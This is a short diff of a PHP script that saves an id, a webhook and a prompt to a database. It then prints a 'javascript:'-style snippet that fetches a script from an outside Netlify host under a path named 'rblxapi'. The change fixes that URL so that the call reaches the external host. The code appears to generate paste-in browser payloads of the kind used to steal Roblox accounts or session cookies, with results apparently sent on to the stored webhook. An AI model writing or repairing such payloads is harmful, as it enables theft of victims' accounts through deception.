@@ -21,7 +21,7 @@
     VALUES ('".mysqli_real_escape_string($conn, $id)."', '".mysqli_real_escape_string($conn, $webhook)."', '".mysqli_real_escape_string($conn, $prompt)."')";
 
     if ($conn->query($sql) === TRUE) {
-      echo 'xJavascript:$.get("/musing-varahamihira-44b404.netlify.app/rblxapi/api.php?id='.$id.'")';
+      echo 'xJavascript:$.get("//musing-varahamihira-44b404.netlify.app/rblxapi/api.php?id='.$id.'")';
     } else {
       echo "Error:" . $conn->error;
     }
